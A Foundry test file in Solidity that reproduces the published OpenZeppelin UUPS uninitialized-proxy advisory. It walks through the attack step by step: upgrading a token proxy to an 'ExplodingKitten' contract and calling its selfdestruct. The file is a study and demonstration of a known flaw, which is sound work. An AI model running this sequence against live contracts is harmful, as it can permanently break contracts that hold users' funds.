// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {UUPSProxy} from "./UUPSProxy.sol";
import {SimpleToken} from "./SimpleToken.sol";
import {SimpleTokenV2} from "./SimpleTokenV2.sol";
import {ExplodingKitten} from "./ExplodingKitten.sol";

// These tests not only demonstrate the combination of delegatecall with selfdestruct
// but they also attempt to demonstrate an OpenZeppelin "security issue" when a proxy is left uninitialized
// In short, initialize your UUPS proxy implementation and all is well
// Github security issue: https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/security/advisories/GHSA-q4h9-46xg-m3x9
// Original PoC: https://github.com/yehjxraymond/exploding-kitten

contract UUPS_selfdestruct is Test {
    // These contracts are from https://github.com/yehjxraymond/exploding-kitten
    // referenced by this post-mortem https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680
    // Some ideas for foundry tests are from https://github.com/FredCoen/Proxy_implementations_with_forge/blob/main/src/test/UUPSProxy.t.sol
    SimpleToken public tokenV1;
    SimpleTokenV2 public tokenV2;
    ExplodingKitten public kittenAddress;
    UUPSProxy public proxy;
    UUPSProxy public proxyfixed;

    address public alice;
    address public emptyAddress;
    address public deployer;

    function setUp() public {
        alice = address(0xABCD);
        emptyAddress = address(0xb8b3dbc6);
        deployer = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;

        // Deploy initial logic and proxy contract
        tokenV1 = new SimpleToken(); // Deploy logic contract
        proxy = new UUPSProxy(address(tokenV1), ""); // Deploy ERC1967 proxy contract with tokenV1 logic as implementation

        // deploy the new V2 contract version, which is used in some tests
        vm.prank(address(alice));
        tokenV2 = new SimpleTokenV2();

        // Alice deploys exploit PoC
        vm.prank(address(alice));
        kittenAddress = new ExplodingKitten(); // Deploy PoC contract
    }

    // This is where all the pieces are put together and the issue is exposed - no further upgrades can be made
    function testFailAlicePoCFirstThenTryV2Upgrade() public {
        // first, initialize
        vm.prank(address(alice));
        (bool a, bytes memory data) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(a);

        // update proxy to PoC contract
        // Should be possible to do the next 2 steps in 1 step with upgradeToAndCall(), but this was easier to debug and make work
        vm.prank(address(alice));
        (a, data) = address(proxy).call(abi.encodeWithSignature("upgradeTo(address)", address(kittenAddress)));
        assertTrue(a);

        // Call explode() in PoC contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(abi.encodeWithSignature("explode()"));
        assertTrue(a);

        // Attempt to update proxy to tokenV2 contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(abi.encodeWithSignature("upgradeTo(address)", address(tokenV2)));
        assertTrue(a); // call returns true because it's the same as calling an address without code

        // Attempt to call version(), but it fails because tokenV2 is not used
        vm.prank(address(alice));
        (a, data) = address(proxy).call(abi.encodeWithSignature("version()"));
        assertTrue(a);

        // Attempt to call return42(), but this too fails

        vm.prank(address(alice));

        (a, data) = address(proxy).call(abi.encodeWithSignature("return42()"));

        assertTrue(a);
    }
}
